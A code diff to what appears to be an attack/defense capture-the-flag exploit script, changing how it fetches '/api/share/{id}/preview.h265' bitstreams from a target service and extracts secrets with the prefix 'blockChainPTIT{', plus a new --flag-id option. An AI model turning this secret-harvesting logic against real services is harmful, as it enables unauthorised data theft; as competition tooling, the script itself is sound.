@@ -138,12 +138,22 @@ def cmd_get(args) -> int:
 
 def cmd_exploit(args) -> int:
     url = base_url(args.host, args.port)
-    listing = http_json(f"{url}/api/debug/list")
-    found = []
-    for filename in listing.get("files", []):
-        quoted = urllib.parse.quote(filename)
+    if args.flag_id:
         try:
-            bitstream = http_bytes(f"{url}/api/debug/file/{quoted}")
+            decoded = json.loads(args.flag_id)
+            items = [{"id": decoded["id"], "preview_url": f"/api/share/{decoded['id']}/preview.h265"}]
+        except Exception:
+            items = [{"id": args.flag_id, "preview_url": f"/api/share/{args.flag_id}/preview.h265"}]
+    else:
+        listing = http_json(f"{url}/api/vaults")
+        items = listing.get("items", [])
+
+    found = []
+    for item in items:
+        preview_url = item.get("preview_url") or f"/api/share/{item.get('id')}/preview.h265"
+        quoted = urllib.parse.quote(preview_url, safe="/._-")
+        try:
+            bitstream = http_bytes(f"{url}{quoted}")
             secret = extract_secret(bitstream)
         except Exception:
             continue
@@ -164,6 +174,7 @@ def main() -> int:
         p.add_argument("port", type=int)
         if name == "exploit":
             p.add_argument("--prefix", default="blockChainPTIT{")
+            p.add_argument("--flag-id")
         p.set_defaults(func=cmd_check if name == "check" else cmd_exploit)
 
     p = sub.add_parser("put")
